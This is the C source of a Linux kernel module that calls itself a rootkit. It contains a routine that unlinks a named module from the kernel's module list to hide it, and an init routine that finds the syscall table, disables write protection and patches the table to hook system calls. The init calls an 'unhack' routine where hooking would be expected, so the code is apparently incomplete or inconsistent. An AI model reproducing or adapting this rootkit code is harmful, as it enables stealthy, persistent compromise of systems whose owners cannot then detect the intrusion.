#include "main.h"
#include "config.h"
#include "syscalltable.h"
#include "list.h"
#include "cmd.h"

unsigned long **sys_call_table;
//static unsigned long irq_flags;
struct list_head* module_list_head = NULL;
long clone_pid = 0;
long clone_flag = 0;
long clone_count = 0;
long clone_tid = 0;
long clone_lasttid = 0;

long vfork_pid = 0;
long vfork_flag = 0;
long vfork_count = 0;
long vfork_spid = 0;
long vfork_lastpid = 0;
long process_count = 0;
unsigned int rtpid = -1;
unsigned int rtfd = -1;
	
void
del_lkm(const char *name) {
	struct module * pmod;
	struct list_head *plist;
	//struct list_head *plisthead;

	if(module_list_head == NULL) {
		module_list_head = &__this_module.list;
	}

	plist = module_list_head;

	while (plist) {
		pmod = list_entry(plist, struct module, list);
		if (!strcmp(name, pmod->name)) {
			if (module_list_head == plist) {
				module_list_head = module_list_head->prev;
			}

			plist->next->prev = plist->prev;
			plist->prev->next = plist->next;

			break;
		}

		plist = plist->prev;

		if (plist == module_list_head) {
			break;
		}
	}
}

static int __init
ThisInit(void) {
	DLog("rootkit init");

	sys_call_table = find_sys_call_table();
	if (NULL != sys_call_table) {
		DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
	}
	else {
		DLog("get sys_call_table failure!");
		return -1;
	}
	//	local_irq_save(irq_flags);
	
	backup_sys_call_table();
	disable_write_protection();
	unhack_sys_call_talbe();
	enable_write_protection();
	
	//local_irq_restore(irq_flags);
	return 0;
}

static void __exit
ThisExit(void) {
	//local_irq_save(irq_flags);
	
	disable_write_protection();	
	unhack_sys_call_talbe();
	enable_write_protection();
	
	//local_irq_restore(irq_flags);
	DLog("rootkit exit");
}

module_init(ThisInit);  //模块入口函数
module_exit(ThisExit);  //模块出口函数
MODULE_LICENSE("GPL");
MODULE_AUTHOR("youyifeng");
MODULE_DESCRIPTION("This module can hook the sys_* function.");
